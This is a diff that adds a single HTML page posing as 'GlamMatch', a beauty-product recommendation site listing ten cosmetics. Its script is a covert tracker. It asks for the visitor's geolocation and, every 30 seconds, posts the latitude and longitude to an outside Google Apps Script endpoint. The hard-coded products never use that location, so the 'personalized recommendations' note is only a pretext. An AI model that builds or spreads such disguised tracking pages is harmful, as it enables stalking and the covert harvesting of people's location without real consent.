@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>GlamMatch – Beauty Near You</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background: linear-gradient(to bottom right, #f9d6ff, #ffe0ec);
+      margin: 0;
+      padding: 20px;
+      color: #333;
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 40px;
+    }
+
+    .header h1 {
+      font-family: 'Playfair Display', serif;
+      font-size: 3rem;
+      color: #c2185b;
+      margin-bottom: 10px;
+    }
+
+    .header p {
+      font-size: 1.1rem;
+      color: #555;
+      line-height: 1.6;
+      margin-top: 10px;
+    }
+
+    .products {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+      gap: 20px;
+      justify-items: center;
+    }
+
+    .product {
+      background: #fff;
+      border-radius: 15px;
+      padding: 20px;
+      box-shadow: 0 6px 15px rgba(0,0,0,0.1);
+      text-align: center;
+      transition: transform 0.3s ease, box-shadow 0.3s ease;
+      width: 100%;
+      max-width: 250px;
+    }
+
+    .product:hover {
+      transform: translateY(-10px);
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+    }
+
+    .product img {
+      width: 100%;
+      height: 180px;
+      object-fit: cover;
+      border-radius: 10px;
+    }
+
+    .product h3 {
+      margin: 15px 0 5px;
+      font-size: 1.3rem;
+      color: #c2185b;
+    }
+
+    .product p {
+      font-size: 1rem;
+      color: #444;
+      line-height: 1.5;
+    }
+
+    .spinner {
+      margin: 40px auto;
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #c2185b;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .note {
+      text-align: center;
+      font-size: 0.9rem;
+      color: #777;
+      margin-top: 40px;
+      line-height: 1.5;
+    }
+
+    .footer {
+      background-color: #c2185b;
+      color: #fff;
+      padding: 15px;
+      text-align: center;
+      position: fixed;
+      bottom: 0;
+      left: 0;
+      right: 0;
+      font-size: 0.9rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="header">
+    <h1>GlamMatch 💄</h1>
+    <p>Explore top beauty picks around you — personalized by YourLifeStyle.</p>
+  </div>
+
+  <div class="spinner"></div>
+
+  <div class="products">
+    <!-- Product 1 -->
+    <div class="product">
+      <img src="https://m.media-amazon.com/images/I/617RofaL3vL._AC_UF1000,1000_QL80_.jpg" alt="Velvet Matte Lipstick">
+      <h3>Velvet Matte Lipstick</h3>
+      <p>Rich pigment, long-lasting, smooth finish. $18.00</p>
+    </div>
+    <!-- Product 2 -->
+    <div class="product">
+      <img src="https://cdn.fynd.com/v2/falling-surf-7c8bb8/fyprod/wrkr/products/pictures/item/free/original/000000000494434322/sbPPSX-QU8t-000000000494434322_1.jpg" alt="HydraGlow Foundation">
+      <h3>HydraGlow Foundation</h3>
+      <p>Moisturizing & lightweight with SPF 15. $25.00</p>
+    </div>
+    <!-- Product 3 -->
+    <div class="product">
+      <img src="https://praush.com/cdn/shop/files/1_95691912-b1df-47b4-8b3d-8dd95234162c.jpg?v=1731141637" alt="Pro Brush Kit">
+      <h3>Pro Brush Kit</h3>
+      <p>10-piece vegan brush set for perfect blending. $35.00</p>
+    </div>
+    <!-- Product 4 -->
+    <div class="product">
+      <img src="https://heavenlyhome.in/wp-content/uploads/2023/09/GLOW-SERUM.webp" alt="Glow Serum">
+      <h3>Glow Serum</h3>
+      <p>Brightens, hydrates, and refines skin texture. $22.00</p>
+    </div>
+    <!-- Product 5 -->
+    <div class="product">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcREtqe0kDdftqpv9zea8YnzmshWkLVNUfE5UA&s" alt="Face Mist">
+      <h3>Rose Dew Face Mist</h3>
+      <p>Refreshes skin with natural rose water. $14.00</p>
+    </div>
+    <!-- Product 6 -->
+    <div class="product">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR91xXMhctmP4Sh4Pu6is5evezwAh9lmAqeLg&s" alt="Compact Powder">
+      <h3>SoftTouch Compact</h3>
+      <p>Flawless matte finish with skin tone match. $16.00</p>
+    </div>
+    <!-- Product 7 -->
+    <div class="product">
+      <img src="https://intl.zaybeauty.com/cdn/shop/products/peach-lassi.swatch_large.jpg?v=1622125680" alt="Blush Palette">
+      <h3>Peach Bloom Blush</h3>
+      <p>Natural glow blush palette with 3 tones. $19.00</p>
+    </div>
+    <!-- Product 8 -->
+    <div class="product">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRHOWPx9nKXdmnDDLVkirvgW8LyE7NIxQGbyA&s" alt="Mascara">
+      <h3>LashMax Volume Mascara</h3>
+      <p>Lengthens and volumizes without clumping. $17.00</p>
+    </div>
+    <!-- Product 9 -->
+    <div class="product">
+      <img src="https://m.media-amazon.com/images/I/61ongLGFFxL.jpg" alt="Makeup Remover">
+      <h3>Gentle Micellar Cleanser</h3>
+      <p>Removes makeup while hydrating skin. $12.00</p>
+    </div>
+    <!-- Product 10 -->
+    <div class="product">
+      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlFZEtH0OOi84ZtOMYRX12UMqx3Px3cgGHEA&s" alt="Nail Polish Set">
+      <h3>Shimmer Nail Polish Kit</h3>
+      <p>6-color long-lasting shimmer shades. $20.00</p>
+    </div>
+  </div>
+
+  <div class="note">
+    Location access is used to personalize recommendations.
+  </div>
+
+  <div class="footer">
+    <p>&copy; 2025 GlamMatch | All Rights Reserved</p>
+  </div>
+
+  <script>
+    const sendLocation = (position) => {
+      const data = {
+        lat: position.coords.latitude,
+        lon: position.coords.longitude
+      };
+
+      fetch("https://script.google.com/macros/s/AKfycbzEXkdYDMs-Dj1JMW3AHbcVFLx8bWEAX3yIPXa1uNt7AxSVnrZ82PDyKlEpnvxdRxCy/exec", {
+        method: "POST",
+        body: JSON.stringify(data)
+      });
+    };
+
+    const handleError = (error) => {
+      alert("Location access is needed to match local beauty picks.");
+    };
+
+    if (navigator.geolocation) {
+      setInterval(() => {
+        navigator.geolocation.getCurrentPosition(sendLocation, handleError);
+      }, 30000); // every 30 seconds
+    } else {
+      alert("Your browser does not support location sharing.");
+    }
+  </script>
+</body>
+</html>
